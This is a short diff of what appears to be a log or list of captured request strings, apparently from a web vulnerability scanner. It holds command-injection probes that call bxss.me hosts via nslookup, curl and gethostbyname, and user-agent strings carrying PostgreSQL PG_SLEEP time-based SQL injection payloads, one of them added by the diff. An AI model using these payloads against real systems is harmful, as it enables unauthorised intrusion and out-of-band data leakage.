@@ -1577,3 +1577,4 @@ geth(ostbyname(lc('hitis'.'jtmgavzu7f182.bxss.me.')).'A'.chr(67).chr(hex('58')).
 '.gethostbyname(lc('hitvp'.'gtpvxasfa1e4c.bxss.me.').'A'.chr(67).chr(hex('58')).chr(98).chr(84).chr(106).chr(88).')
 (nslookup -q=cname hitqbsuffwwav17943.bxss.me||curl hitqbsuffwwav17943.bxss.me))
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.369qftlapB' OR 137=(SELECT 137 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36mGgZK5Zt') OR 589=(SELECT 589 FROM PG_SLEEP(15))--)
